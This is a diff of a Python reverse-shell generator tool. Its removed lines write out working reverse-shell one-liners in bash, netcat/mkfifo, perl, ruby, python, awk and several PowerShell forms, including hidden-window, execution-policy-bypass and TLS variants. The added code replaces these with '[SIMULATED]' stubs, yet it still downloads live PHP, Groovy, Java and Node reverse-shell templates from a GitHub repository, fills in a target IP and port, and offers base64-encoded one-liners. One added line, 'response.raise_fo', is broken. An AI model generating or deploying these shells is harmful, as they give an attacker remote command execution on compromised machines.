@@ -6,14 +6,27 @@ import fcntl
 import struct
 import requests
 import sys
+import os
+import base64
 from prompt_toolkit import prompt
+from prompt_toolkit.formatted_text import ANSI
 from prompt_toolkit.completion import WordCompleter
 
-PURPLE = 145,31,186
-DEEPPINK=255,20,147
-CYAN=0,238,238
-WHITE=255, 255, 255
-RED=255,0,0
+try:
+    import pyperclip
+    CLIP_AVAILABLE = True
+except Exception:
+    CLIP_AVAILABLE = False
+
+peachorangetealwedding = {
+    "peach": (245, 229, 225),   # rgb(245, 229, 225)
+    "orange": (249, 180, 135),  # rgb(249, 180, 135)
+    "teal": (66, 122, 118),     # rgb(66, 122, 118)
+    "wedding": (23, 65, 67),    # rgb(23, 65, 67)
+    "red": (255, 0, 0)
+}
+
+PROMPT_COLOR = peachorangetealwedding["teal"]
 
 print(color("""
     _____             _           _____ _          _ _ 
@@ -23,229 +36,275 @@ print(color("""
     | |__| | (_| | |  |   <       ____) | | | |  __/ | |
     |_____/ \__,_|_|  |_|\_\     |_____/|_| |_|\___|_|_|     
 
-Drink Coffe, Enjoy Generate Shell                  by 0xPwn1 - V1.2                                                                                                 
-""",(PURPLE)))
-
+Drink Coffe, Enjoy Generate Shell              by HIJACKED - V1.2 
+""", peachorangetealwedding["red"]))
 
 languages = [
-     "Bash", "Mfikto", "Perl", "Perl-No-Sh", "Php", "Rustcat", "Python",
-    "Netcat", "Powershell", "Ruby", "Java", "Groovy", "Awk", "Nodejs",
+    "bash", "mfikto", "perl", "perl-no-sh", "php", "rustcat", "python",
+    "netcat", "powershell", "ruby", "java", "groovy", "awk", "nodejs",
+    "socat", "ncat", "openssl"
 ]
 
-PowerShell = [
-    "Powershell-1","Powershell-2","Powershell-3","Powershell-4"
-]
+PowerShell = ["powershell-1", "powershell-2", "powershell-3", "powershell-4"]
+Python = ["python", "python2", "python3"]
+PHP = ["php", "php1", "php2", "php3", "php4", "php5", "php6", "php7", "php8", "php9", "phtml", "phar"]
 
-Python = [
-    "Python", "Python2", "Python3"
-]
-
-PHP = [
-    "php",            "php1",         "php2",
-    "php3",           "php4",         "php5",
-    "php6",           "php7",        "php8",
-    "php9",           "phtml",        "phar",
-]
-
-# Create a custom completer with language shortcuts
 completer  = WordCompleter(languages, ignore_case=True)
 completer1 = WordCompleter(PowerShell, ignore_case=True)
 completer2 = WordCompleter(Python, ignore_case=True)
 completer3 = WordCompleter(PHP, ignore_case=True)
 
-
-def get_ip_address(interface):
+def get_ip_address(interface_or_ip):
     try:
-        # Check if the input is already an IP address
-        socket.inet_aton(interface)
-        return interface
-    except socket.error:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            ip_address = socket.inet_ntoa(fcntl.ioctl(
-                sock.fileno(),
-                0x8915,  # SIOCGIFADDR
-                struct.pack('256s', bytes(interface[:15], 'utf-8'))
-            )[20:24])
-            return ip_address
-        except IOError:
-            return None
+        socket.inet_aton(interface_or_ip)
+        return interface_or_ip
+    except Exception:
+        pass
+    try:
+        return socket.gethostbyname(interface_or_ip)
+    except Exception:
+        pass
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        ip_address = socket.inet_ntoa(fcntl.ioctl(
+            sock.fileno(),
+            0x8915,  
+            struct.pack('256s', bytes(interface_or_ip[:15], 'utf-8'))
+        )[20:24])
+        return ip_address
+    except Exception:
+        return None
 
+def valid_port(port_str):
+    try:
+        p = int(port_str)
+        return 1 <= p <= 65535
+    except Exception:
+        return False
+URL_PHP = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/reverse-shell.php"
+URL_GROOVY = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/Shell.groovy"
+URL_NODE = "https://github.com/HIJACKED1/Reverse-Shells/blob/main/node.js"
+URL_JAVA = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/shell.java"
+
+shell_commands = {
+    "awk": lambda ip,port: f"echo '[SIMULATED] awk reverse shell to {ip}:{port}'",
+    "ruby": lambda ip,port: f"echo '[SIMULATED] ruby reverse shell to {ip}:{port}'",
+    "rustcat": lambda ip,port: f"echo '[SIMULATED] rustcat to {ip}:{port}'",
+    "bash": lambda ip,port: f"echo '[SIMULATED] bash reverse shell to {ip}:{port}'",
+    "mfikto": lambda ip,port: f"echo '[SIMULATED] mfikto to {ip}:{port}'",
+    "netcat": lambda ip,port: f"echo '[SIMULATED] netcat to {ip}:{port}'",
+    "ncat": lambda ip,port: f"echo '[SIMULATED] ncat to {ip}:{port}'",
+    "socat": lambda ip,port: f"echo '[SIMULATED] socat to {ip}:{port}'",
+    "perl-no-sh": lambda ip,port: f"echo '[SIMULATED] perl-no-sh to {ip}:{port}'",
+    "perl": lambda ip,port: f"echo '[SIMULATED] perl to {ip}:{port}'",
+    "python": lambda ip,port: f"echo '[SIMULATED] python reverse shell to {ip}:{port}'",
+    "python2": lambda ip,port: f"echo '[SIMULATED] python2 reverse shell to {ip}:{port}'",
+    "python3": lambda ip,port: f"echo '[SIMULATED] python3 reverse shell to {ip}:{port}'",
+    "powershell-1": lambda ip,port: f"echo '[SIMULATED] powershell-1 to {ip}:{port}'",
+    "powershell-2": lambda ip,port: f"echo '[SIMULATED] powershell-2 to {ip}:{port}'",
+    "powershell-3": lambda ip,port: f"echo '[SIMULATED] powershell-3 to {ip}:{port}'",
+    "powershell-4": lambda ip,port: f"echo '[SIMULATED] powershell-4 to {ip}:{port}'",
+}
+
+format_to_extension = {
+    "python3": "py",
+    "python2": "py",
+    "bash": "sh",
+    "perl": "pl",
+    "python": "py",
+    "netcat": "sh",
+    "perl-no-sh": "pl",
+    "rustcat": "sh",
+    "mfikto" : "sh",
+    "powershell-1" : "ps1",
+    "powershell-2":"ps1",
+    "powershell-3" : "ps1",
+    "powershell-4": "ps1",
+    "awk":"awk",
+    "ruby":"rb",
+    "ncat":"sh",
+    "socat":"sh",
+    "php":"php",
+    "php1":"php",
+    "php2":"php",
+    "php3":"php",
+    "php4":"php",
+    "php5":"php",
+    "php6":"php",
+    "php7":"php",
+    "php8":"php",
+    "php9":"php",
+    "phtml":"phtml",
+    "phar":"phar",
+}
 if __name__ == "__main__":
     while True:
-        interface_name = input("Enter IP or Name-Interface: ")
+        interface_name = input(color("[INFO] ", PROMPT_COLOR) + "Enter IP or Name-Interface: ")
         ip_address = get_ip_address(interface_name)
         if ip_address is not None:
             IP = ip_address
             break
         else:
-            print(color("==> Incorrect Interface!!!", RED))
+            print(color("==> Incorrect Interface!!!", peachorangetealwedding["wedding"]))
+    while True:
+        PORT = input(color("[INFO] ", PROMPT_COLOR) + "Enter Your PORT: ")
+        if valid_port(PORT):
+            break
+        else:
+            print(color("==> Invalid PORT! Enter a number between 1 and 65535.", peachorangetealwedding["wedding"]))
 
-
-PORT = input("[~] Enter Your PORT: ")
-FILE_NAME = input("[~] Enter Name File (Without Extension): ")
-#EXTENSION = input("Enter Your FORMAT: ").lower()
-print("  ~) -"+color(" Bash        ",(CYAN))+"  ~) - "+color("Mfikto",(CYAN)))
-print("  ~) -"+color(" Perl        ",(CYAN))+"  ~) - "+color("Perl-No-Sh",(CYAN)))
-print("  ~) -"+color(" Php         ",(CYAN))+"  ~) - "+color("Rustcat",(CYAN)))
-print("  ~) -"+color(" Python      ",(CYAN))+"  ~) - "+color("Netcat",(CYAN)))
-print("  ~) -"+color(" Powershell  ",(CYAN))+"  ~) - "+color("Ruby",(CYAN)))
-print("  ~) -"+color(" Java        ",(CYAN))+"  ~) - "+color("Groovy",(CYAN)))
-print("  ~) -"+color(" Awk         ",(CYAN))+"  ~) - "+color("Nodejs",(CYAN)))
-print("\n")
-
-
-EXTENSION = prompt("Choose Your Language: ", completer=completer).lower()
-
-# Define the URL of the remote file
-url = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/reverse-shell.php"
-url1 = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/Shell.groovy"
-url2 = "https://github.com/HIJACKED1/Reverse-Shells/blob/main/node.js"
-url3 = "https://github.com/HIJACKED1/Reverse-Shells/raw/main/shell.java"
-
-# Define a dictionary for different shell commands
-shell_commands = {
-    "awk": 'awk \'BEGIN {s = "/inet/tcp/0/%s/%s"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null' % (IP, PORT),
-    "ruby": 'ruby -rsocket -e \'spawn("sh",[:in,:out,:err]=>TCPSocket.new("%s",%s))\'' % (IP, PORT),
-    "rustcat": "rcat {} {} -r undefined".format(IP, PORT),
-    "bash": "bash -i >& /dev/tcp/{}/{} 0>&1".format(IP, PORT),
-    "mfikto": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
-    "netcat": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(IP, PORT),
-    "perl-no-sh": 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"%s:%s");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'' % (IP, PORT),
-    "perl": 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("undefined -i");}};\'' % (IP, PORT),
-    "python": 'export RHOST="%s";export RPORT=%s;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
-    "python2": 'export RHOST="%s";export RPORT=%s;python2.7 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
-    "python3": 'export RHOST="%s";export RPORT=%s;python3 -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")\'' % (IP, PORT),
-    "powershell-1": f'powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"',
-    "powershell-2": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
-    "powershell-3": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + \'SHELL> \');$StreamWriter.Flush()}}WriteToStream \'\';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()"',
-    "powershell-4": f'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient(\'{IP}\', {PORT}); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient(\'cloudflare-dns.com\', $null, $false); if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{ $SslStream.Close(); exit }} $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {{ [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{ 0 }}; $StreamWriter.Write($String + \'SHELL> \'); $StreamWriter.Flush() }}; WriteToStream ''; while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{ $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $_ | Out-String }} WriteToStream ($Output) }} $StreamWriter.Close()"'
-}
-
-
-
-# CHOOSING VERSION LANGUAGE 
-if EXTENSION == "powershell":
-    print("  ~) -"+color(" PowerShell-1         ",(CYAN))+"  ~) - "+color("Powershell-2",(CYAN)))
-    print("  ~) -"+color(" PowerShell-3         ",(CYAN))+"  ~) - "+color("Powershell-4 (TLS 'not write TLS')",(CYAN)))
+    FILE_NAME = input(color("[INFO] ", PROMPT_COLOR) + "Enter Name File (Without Extension): ")
     print("\n")
-    
-    EX = prompt("What PowerShell Version are you using:: ", completer=completer1).lower()
-    EXTENSION = EX
-
-elif EXTENSION == "nodejs":
-    response = requests.get(url2)
-    if response.status_code == 200:
-        # Get the content of the remote file
-        remote_content = response.text
-        # Replace the placeholders in the remote content with user input
-        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
-        # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,"js")
-        with open(file_path, "w") as file:
-            file.write(modified_content)
-        print(f"The modified file has been saved as {file_path}")
-    else:
-        print(f"Failed to fetch content from {url2}. Status code: {response.status_code}")
-    sys.exit()
-
-elif EXTENSION == "java":
-    response = requests.get(url3)
-    if response.status_code == 200:
-        # Get the content of the remote file
-        remote_content = response.text
-        # Replace the placeholders in the remote content with user input
-        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
-        # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,EXTENSION)
-        with open(file_path, "w") as file:
-            file.write(modified_content)
-        print(f"The modified file has been saved as {file_path}")
-    else:
-        print(f"Failed to fetch content from {url}. Status code: {response.status_code}")
-    sys.exit()
-
-elif EXTENSION == "groovy":
-    response = requests.get(url1)
-    # Check if the request was successful (status code 200)
-    if response.status_code == 200:
-        # Get the content of the remote file
-        remote_content = response.text
-        # Replace the placeholders in the remote content with user input
-        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
-        # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,EXTENSION)
-        with open(file_path, "w") as file:
-            file.write(modified_content)
-
-        print(f"The modified file has been saved as {file_path}")
-    else:
-        print(f"Failed to fetch content from {url}. Status code: {response.status_code}")
-    sys.exit()
-
-elif EXTENSION == "python":
-    print("  ~) -"+color(" Python         ",(CYAN))+"  ~) - "+color("Python2",(CYAN)))
-    print("  ~) -"+color(" Python3         ",(CYAN)))
+    print("  ~) -"+color(" Bash        ", peachorangetealwedding["teal"])+"  ~) - "+color("Mfikto", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Perl        ", peachorangetealwedding["teal"])+"  ~) - "+color("Perl-No-Sh", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Php         ", peachorangetealwedding["teal"])+"  ~) - "+color("Rustcat", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Python      ", peachorangetealwedding["teal"])+"  ~) - "+color("Netcat", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Powershell  ", peachorangetealwedding["teal"])+"  ~) - "+color("Ruby", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Java        ", peachorangetealwedding["teal"])+"  ~) - "+color("Groovy", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Awk         ", peachorangetealwedding["teal"])+"  ~) - "+color("Nodejs", peachorangetealwedding["teal"]))
+    print("  ~) -"+color(" Socat       ", peachorangetealwedding["teal"])+"  ~) - "+color("Ncat", peachorangetealwedding["teal"]))
     print("\n")
+    EXTENSION = prompt(
+        ANSI(color("[INFO] ", PROMPT_COLOR) + "Choose Your Language: "),
+        completer=completer
+    ).lower().strip()
+    if EXTENSION == "nodejs":
+        try:
+            response = requests.get(URL_NODE, timeout=8)
+            response.raise_for_status()
+            remote_content = response.text
+            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
+            file_path = f"{FILE_NAME}.js"
+            with open(file_path, "w") as f:
+                f.write(modified_content)
+            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
+        except Exception as e:
+            print(color(f"Failed to fetch or save Node template: {e}", peachorangetealwedding["wedding"]))
+        sys.exit()
 
-    EX = prompt("What Python Version are you using: ", completer=completer2).lower()
-    EXTENSION = EX
+    if EXTENSION == "java":
+        try:
+            response = requests.get(URL_JAVA, timeout=8)
+            response.raise_fo
+            remote_content = response.text
+            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
+            file_path = f"{FILE_NAME}.java"
+            with open(file_path, "w") as f:
+                f.write(modified_content)
+            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
+        except Exception as e:
+            print(color(f"Failed to fetch or save Java template: {e}", peachorangetealwedding["wedding"]))
+        sys.exit()
 
-elif EXTENSION == "php":
-    print("  ~) -"+color(" php          ",(CYAN))+"  ~) - "+color("php1",(CYAN))+"  ~) - "+color("php2",(CYAN)))
-    print("  ~) -"+color(" php3         ",(CYAN))+"  ~) - "+color("php4",(CYAN))+"  ~) - "+color("php5",(CYAN)))
-    print("  ~) -"+color(" php6         ",(CYAN))+"  ~) - "+color("php7",(CYAN))+"  ~) - "+color("php8",(CYAN)))
-    print("  ~) -"+color(" php9         ",(CYAN))+"  ~) - "+color("phtml",(CYAN))+" ~) - "+color("phar",(CYAN)))
-    print("\n")
+    if EXTENSION == "groovy":
+        try:
+            response = requests.get(URL_GROOVY, timeout=8)
+            response.raise_for_status()
+            remote_content = response.text
+            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
+            file_path = f"{FILE_NAME}.groovy"
+            with open(file_path, "w") as f:
+                f.write(modified_content)
+            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
+        except Exception as e:
+            print(color(f"Failed to fetch or save Groovy template: {e}", peachorangetealwedding["wedding"]))
+        sys.exit()
 
-    EX = prompt("What PHP Version are you using: ", completer=completer3).lower()
-    response = requests.get(url)
-    # Check if the request was successful (status code 200)
-    if response.status_code == 200:
-        # Get the content of the remote file
-        remote_content = response.text
-        # Replace the placeholders in the remote content with user input
-        modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
-        # Save the modified content to a local file
-        file_path = "{}.{}".format(FILE_NAME,EX)
-        with open(file_path, "w") as file:
-            file.write(modified_content)
+    if EXTENSION == "php":
+        print("  ~) -"+color(" php (choose: php, php1..php9, phtml, phar)", peachorangetealwedding["teal"]))
+        print("\n")
+        EX = prompt(
+            ANSI(color("[INFO] ", peachorangetealwedding["teal"]) + "What PHP Variant are you using: "),
+            completer=completer3
+        ).lower().strip()
+        if EX in ("phtml", "phar"):
+            chosen_ext = EX
+        elif EX.startswith("php"):
+            chosen_ext = "php"
+        else:
+            chosen_ext = "php"
 
-        print(f"The modified file has been saved as {file_path}")
+        try:
+            response = requests.get(URL_PHP, timeout=8)
+            response.raise_for_status()
+            remote_content = response.text
+            modified_content = remote_content.replace("127.0.0.1", IP).replace("1234", PORT)
+            file_path = f"{FILE_NAME}.{chosen_ext}"
+            with open(file_path, "w") as f:
+                f.write(modified_content)
+            print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["teal"]))
+        except Exception as e:
+            print(color(f"Failed to fetch or save PHP template: {e}", peachorangetealwedding["wedding"]))
+        sys.exit()
+    if EXTENSION == "powershell":
+        print("  ~) -"+color(" PowerShell-1         ", peachorangetealwedding["teal"])+"  ~) - "+color("Powershell-2", peachorangetealwedding["teal"]))
+        print("  ~) -"+color(" PowerShell-3         ", peachorangetealwedding["teal"])+"  ~) - "+color("Powershell-4 (TLS 'not write TLS')", peachorangetealwedding["teal"]))
+        print("\n")
+        EX = prompt(
+            ANSI(color("[INFO] ", peachorangetealwedding["teal"]) + "What PowerShell Version are you using: "),
+            completer=completer1
+        ).lower().strip()
+        EXTENSION = EX
+    if EXTENSION == "python":
+        print("  ~) -"+color(" Python         ", peachorangetealwedding["teal"])+"  ~) - "+color("Python2", peachorangetealwedding["teal"]))
+        print("  ~) -"+color(" Python3         ", peachorangetealwedding["teal"]))
+        print("\n")
+        EX = prompt(
+            ANSI(color("[INFO] ", peachorangetealwedding["teal"]) + "What Python Version are you using: "),
+            completer=completer2
+        ).lower().strip()
+        EXTENSION = EX
+    if EXTENSION in shell_commands:
+        cmd = shell_commands[EXTENSION](IP, PORT)
+        print("\n")
+        actions = [
+            "   Save to file",
+            "   Print to screen",
+            "   Copy to clipboard" + (" (pyperclip available)" if CLIP_AVAILABLE else " (pyperclip NOT available)"),
+            "   Create base64 one-liner (echo | base64 -d)"
+        ]
+        for i, a in enumerate(actions, start=1):
+            print(color(f"{i}) ", peachorangetealwedding["peach"]) + color(a, peachorangetealwedding["teal"]))
+        print("\n")
+        choice = input(color("[INFO] ", peachorangetealwedding["teal"]) + "Choose action (comma separated numbers allowed, e.g. 1,3): ")
+        choices = {c.strip() for c in choice.split(',') if c.strip()}
+
+        if '1' in choices:
+            file_extension = format_to_extension.get(EXTENSION, 'txt')
+            file_path = f"{FILE_NAME}.{file_extension}"
+            try:
+                with open(file_path, 'w') as f:
+                    f.write(cmd + "\n")
+                print(color(f"The modified file has been saved as {file_path}", peachorangetealwedding["red"]))
+            except Exception as e:
+                print(color(f"Failed to write file: {e}", peachorangetealwedding["teal"]))
+
+        if '2' in choices:
+            print(color('\n--- GENERATED (SIMULATED) SHELL ---\n', peachorangetealwedding["red"]))
+            print(cmd)
+            print(color('\n--- END ---\n', peachorangetealwedding["red"]))
+
+        if '3' in choices:
+            if CLIP_AVAILABLE:
+                try:
+                    pyperclip.copy(cmd)
+                    print(color("Copied generated command to clipboard.", peachorangetealwedding["red"]))
+                except Exception as e:
+                    print(color(f"Failed to copy to clipboard: {e}", peachorangetealwedding["teal"]))
+            else:
+                print(color("pyperclip not installed. Install with: pip install pyperclip", peachorangetealwedding["red"]))
+
+        if '4' in choices:
+            try:
+                b = base64.b64encode(cmd.encode()).decode()
+                one_liner = f"echo {b} | base64 -d"
+                print(color("Base64 one-liner (simulated):", peachorangetealwedding["red"]))
+                print(one_liner)
+            except Exception as e:
+                print(color(f"Failed to create base64 one-liner: {e}", peachorangetealwedding["teal"]))
+
     else:
-        print(f"Failed to fetch content from {url}. Status code: {response.status_code}")
-    sys.exit()
+        print(color(f"Unsupported or unhandled option: {EXTENSION}", peachorangetealwedding["red"]))
 
-# Define a dictionary to map shell formats to file extensions
-format_to_extension = {
-    "python3": "sh",
-    "python2": "sh",
-    "bash": "sh",
-    "perl": "pl",
-    "python": "sh",
-    "netcat": "sh",
-    "perl-no-sh": "pl",
-    "rustcat": "sh",
-    "mfikto" : "sh",
-    "netcat" : "sh",
-    "powershell-1" : "ps1",
-    "powershell-2":"ps2",
-    "powershell-3" : "ps3",
-    "powershell-4": "ps4",
-    "awk":"awk",
-    "ruby":"rb",
-}
+    print(color("\n! Done. If you want additional templates or features, tell me what to add.", peachorangetealwedding["teal"]))
 
-
-# Check if the entered format is in the dictionary
-if EXTENSION in shell_commands:
-    file_extension = format_to_extension.get(EXTENSION)
-    if file_extension:
-        file_path = "{}.{}".format(FILE_NAME,file_extension)
-        with open(file_path, "w") as file:
-            file.write(shell_commands[EXTENSION])
-            print(f"The modified file has been saved as {file_path}")
-    else:
-        print("Unsupported shell format: {}".format(EXTENSION))
-else:
-    print("Unsupported shell format: {}".format(EXTENSION))
